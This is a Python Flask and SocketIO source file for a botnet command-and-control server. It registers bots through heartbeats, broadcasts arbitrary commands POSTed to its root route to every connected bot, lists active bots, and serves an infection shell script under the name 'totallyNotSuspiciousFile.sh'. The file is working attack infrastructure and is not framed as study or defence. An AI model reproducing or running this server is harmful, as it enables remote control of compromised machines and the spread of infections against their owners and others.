import time
from typing import Dict, List
from flask import Flask, request, send_file, render_template
from flask_socketio import SocketIO, emit
from flask_cors import CORS, cross_origin
import jsonpickle

from botnet_activity import BotnetActivity

app = Flask(__name__)
cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'
sio = SocketIO(app)

botnets = []


@sio.on('connect')
def connect():
    print("Socket connected")


@sio.event
def disconnect():
    print("Socket disconnected")

@sio.event
def heartbeat(uuid: str):
    global botnets

    botnet: BotnetActivity = None
    for b in botnets:
        if b.uuid == uuid:
            botnet = b

    if botnet is not None:
        botnet.heartbeat()
    else:
        botnets.append(BotnetActivity(uuid))


@app.route('/', methods=["POST"])
def command_control():
    emit("command", request.get_json(), namespace="/", broadcast=True)
    return "Done"

@app.route('/botnets', methods=["GET"])
@cross_origin()
def get_botnets():
    global botnets
    botnets = list(filter(lambda b: (time.time_ns() // 1_000_000) - b.last_seen < 60_000, botnets))
    return jsonpickle.encode(list(map(jsonpickle.encode, botnets)))

@app.route('/script', methods=["GET"])
def myscript():
    path= "Infection script/totallyNotSuspiciousFile.sh"
    return send_file(path)


@app.route('/home')
def home():
    return render_template("index.html")


if __name__ == '__main__':
    sio.run(app)
